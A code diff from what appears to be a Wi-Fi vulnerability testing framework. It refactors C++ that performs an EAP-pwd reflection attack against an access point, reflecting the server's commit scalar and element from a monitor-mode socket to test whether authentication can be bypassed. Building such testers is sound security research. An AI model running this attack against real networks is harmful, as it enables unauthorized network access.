@@ -38,7 +38,6 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 			return false;
 		});
 		if(!eapol){ log(LogLevel::WARNING, "EAP commit ended without success"); return false; }
-		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
 		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
 		send_eapol(eap_att, reflect_commit(*frame));
 	}
@@ -67,7 +66,6 @@ void setup_attack(RunStatus &rs){
 	rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(40));
 	log(LogLevel::INFO, "access_point running");
 	ip::set_ip(rs, "access_point");
-
 }
 
 void run_attack(RunStatus &rs){
@@ -76,23 +74,21 @@ void run_attack(RunStatus &rs){
 	const auto attacker  = rs.get_actor("attacker");
 	const auto ap_actor  = rs.get_actor("access_point");
 
-	const string iface      = attacker.get(SK::iface);
 	const string identity   = att_cfg.at("identity").get<string>();
 	const string ssid       = ap_actor->get(SK::ssid);
-	const Channel channel   = ap_actor->get_channel();
 
 	const HWAddress<6> our_mac(attacker.get(SK::mac));
 	const HWAddress<6> ap_mac(ap_actor.get(SK::mac));
 
-	MonitorSocket sock(iface, attacker.get(SK::netns)); // attacker need to be in netns
+	MonitorSocket sock(attacker.get(SK::iface), attacker.get(SK::netns)); // attacker need to be in netns
 	EAP_Att eap_att{
 		sock,
-		channel,
+		ap_actor->get_channel(),
 		our_mac,
 		ap_mac,
 		ssid,
 		identity,
-		milliseconds{30000} // 30s
+		30s
 	};
 	this_thread::sleep_for(seconds(3)); //FIXME needed for tshark setup?
 	const bool vulnerable = run_reflection_exchange(eap_att);
